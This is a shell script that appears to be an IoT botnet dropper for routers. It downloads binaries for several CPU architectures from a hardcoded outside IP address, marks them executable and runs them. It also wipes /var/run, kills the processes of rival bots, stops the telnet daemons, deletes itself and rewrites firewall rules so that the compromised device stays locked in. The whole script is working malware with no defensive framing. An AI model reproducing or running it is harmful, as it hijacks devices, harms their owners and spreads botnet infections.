#!/bin/sh
# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
# UPLOAD GETBINARIES.SH IN YOUR HTTPD.

# YOUR HTTPD SERVER
REFERENCE_HTTP="http://62.113.243.188/"

# NAME OF BINARIES (UPLOADED IN YOUR HTTPD)
REFERENCE_MIPSEL=".logd_mx"
REFERENCE_MIPS=".logd_ms"
REFERENCE_SUPERH=".logd_sh"
REFERENCE_ARM=".logd_ax"
REFERENCE_PPC=".logd_px"
REFERENCE_X86="x86"

rm -fr /var/run/$REFERENCE_MIPSEL /var/run/$REFERENCE_MIPS /var/run/$REFERENCE_SUPERH /var/run/$REFERENCE_ARM /var/run/$REFERENCE_PPC

ulimit -n 4096
rm -rf /var/etc/enigma.d
rm -rf /var/run/*
killall -9 a
killall -9 m
killall -9 ms
killall -9 s
killall -9 p
killall -9 m1
killall -9 m2
killall -9 m3
killall -9 m4
killall -9 m5

wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
wget -c ${REFERENCE_HTTP}/${REFERENCE_X86} -P /var/tmp && chmod +x /var/run/${REFERENCE_X86} && /var/run/${REFERENCE_X86}

rm -rf armd mipsd mipseld shd ppcd tty_* v6* ip6*

killall -9 armd
killall -9 mipsd
killall -9 mipseld
killall -9 shd
killall -9 ppcd
killall -9 tty_mi
killall -9 tty_ar
killall -9 tty_sh
killall -9 tty_pp
killall -9 ipp
killall -9 ipa
killall -9 ipms
killall -9 ipm
killall -9 v6fuck
killall -9 pnscan

modprobe ip_tables
modprobe iptable_filter

iptables -A INPUT -p tcp --dport 23 -d 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -p tcp --dport 23 -d 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 23 -d 169.0.0.0/8 -j ACCEPT

sleep 5;

/etc/init.d/inet stop
/etc/init.d/inetd stop
/etc/init.d/S50inetd stop

rm -fr /var/run/getbinaries.sh && sleep 2 && iptables -A INPUT -p tcp --dport 23 -j DROP
